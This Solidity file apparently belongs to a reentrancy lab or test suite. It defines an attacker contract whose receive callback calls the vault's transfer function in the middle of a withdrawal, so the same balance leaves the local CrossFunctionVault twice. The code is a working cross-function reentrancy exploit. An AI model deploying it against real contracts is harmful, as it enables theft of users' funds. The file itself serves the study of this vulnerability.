// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./CrossFunctionVault.sol";

contract CrossFunctionAttacker {
    CrossFunctionVault public vault;
    address public receiver;

    constructor(CrossFunctionVault _vault, address _receiver) {
        vault = _vault;
        receiver = _receiver;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= msg.value) {
            vault.transfer(receiver, msg.value);
        }
    }
}
